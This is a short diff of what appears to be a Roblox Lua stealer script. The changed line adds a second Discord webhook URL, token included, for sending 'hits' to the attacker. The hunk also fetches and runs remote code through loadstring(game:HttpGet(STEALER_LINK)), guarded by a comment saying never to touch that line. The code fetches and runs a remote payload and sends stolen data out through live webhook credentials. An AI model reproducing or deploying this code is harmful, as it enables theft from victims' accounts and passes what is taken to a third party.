@@ -249,7 +249,7 @@ pcall(function()
     }
     
     BigHitsWebhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI"
-    SmallHitsWebhook = ""
+    SmallHitsWebhook = "https://discord.com/api/webhooks/1407225870078316554/vgHKGq8V95gJuEWQeKWGwLOf1_mBV24Blncyp9FhO9hZbANFlYXEMvXCUO9catjJqPoz"
     
     loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
 
